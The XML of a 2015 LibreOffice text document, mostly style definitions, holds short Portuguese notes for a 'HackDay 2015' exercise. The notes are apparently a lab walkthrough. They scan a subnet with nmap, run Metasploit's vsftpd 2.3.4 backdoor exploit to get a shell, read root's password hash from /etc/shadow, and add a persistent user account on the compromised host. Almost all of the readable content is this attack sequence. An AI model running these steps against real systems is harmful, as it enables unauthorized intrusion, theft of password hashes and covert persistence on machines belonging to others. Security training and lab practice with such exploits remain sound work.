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/>
    <style:font-face style:name="Courier New" svg:font-family="'Courier New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6d9aa" officeooo:paragraph-rsid="0006d9aa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6d9aa" officeooo:paragraph-rsid="0006d9aa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287b38" officeooo:paragraph-rsid="0006d9aa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88175" officeooo:paragraph-rsid="00088175" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00287a13" officeooo:paragraph-rsid="0006d9aa"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="002adfc2" officeooo:paragraph-rsid="0006d9aa"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000a0965" officeooo:paragraph-rsid="000a0965"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000ba430" officeooo:paragraph-rsid="000ba430"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000d140c" officeooo:paragraph-rsid="000d140c"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000e5176" officeooo:paragraph-rsid="000e5176"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000f741b" officeooo:paragraph-rsid="000f741b"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="000f741b"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Courier New" officeooo:paragraph-rsid="000f741b"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties style:font-name="Courier New" officeooo:paragraph-rsid="000f741b"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="0006d9aa"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="002adfc2"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="000f741b"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties style:font-name="Calibri" fo:font-size="14pt"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties style:font-name="Liberation Serif" fo:font-size="14pt"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties style:font-name="Liberation Serif" fo:font-size="12pt" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties style:font-name="Liberation Serif" fo:font-size="12pt" officeooo:rsid="000f741b" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties style:font-name="Liberation Serif" fo:font-size="12pt" officeooo:rsid="0010350d" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties officeooo:rsid="0010350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ltrando rede</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P3">$<text:span text:style-name="T1">nmap 192.168.2.1-254</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P4">Criar o Banco de dados</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P5">$msfconsole</text:p>
      <text:p text:style-name="P5">$msf&gt;<text:span text:style-name="T2">use auxiliary/scanner/ftp/ftp_version</text:span></text:p>
      <text:p text:style-name="P7">$msf&gt;auxiliary(ftp_version) &gt; show options</text:p>
      <text:p text:style-name="P6">$msf&gt;auxiliary(ftp_version) &gt; set RHOSTS 10.10.10.50</text:p>
      <text:p text:style-name="P6">$run</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P8"><text:a xlink:type="simple" xlink:href="https://community.rapid7.com/docs/DOC-1875#comment-3384" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://community.rapid7.com/docs/DOC-1875#comment-3384</text:a></text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8">$msf&gt; use exploit/unix/ftp/vsftpd_234_backdoor</text:p>
      <text:p text:style-name="P9">$msf&gt; show options</text:p>
      <text:p text:style-name="P9">$msf&gt; set RHOST</text:p>
      <text:p text:style-name="P9">$msf&gt; show payloads</text:p>
      <text:p text:style-name="P10">$msf&gt; set PAYLOAD cmd/unix/interact</text:p>
      <text:p text:style-name="P9">$msf&gt; exploit</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P11">$&gt;whoami</text:p>
      <text:p text:style-name="P11">$&gt;hostname</text:p>
      <text:p text:style-name="P11">$&gt;grep root /etc/shadow</text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T3">$&gt;</text:span><text:span text:style-name="T6">useradd -m -d /home/</text:span><text:span text:style-name="T8">IuriFinger</text:span><text:span text:style-name="T6"> -c "</text:span><text:span text:style-name="T7">HackDay 2015</text:span><text:span text:style-name="T6">" -s /bin/bash </text:span><text:span text:style-name="T8">IuriFinger</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T3">$&gt;</text:span>grep <text:span text:style-name="T9">IuriFinger</text:span> /etc/passwd</text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">$&gt;</text:span>date</text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T6"/></text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8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alibri" svg:font-family="Calibri"/>
    <style:font-face style:name="Courier New" svg:font-family="'Courier New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6T09:10:47.168450536</meta:creation-date>
    <dc:date>2015-09-26T10:58:32.724704538</dc:date>
    <meta:editing-duration>PT10M48S</meta:editing-duration>
    <meta:editing-cycles>3</meta:editing-cycles>
    <meta:generator>LibreOffice/4.3.3.2$Linux_X86_64 LibreOffice_project/430m0$Build-2</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="1" meta:paragraph-count="21" meta:word-count="60" meta:character-count="559" meta:non-whitespace-character-count="520"/>
  </office:meta>
</office:document-meta>
</file>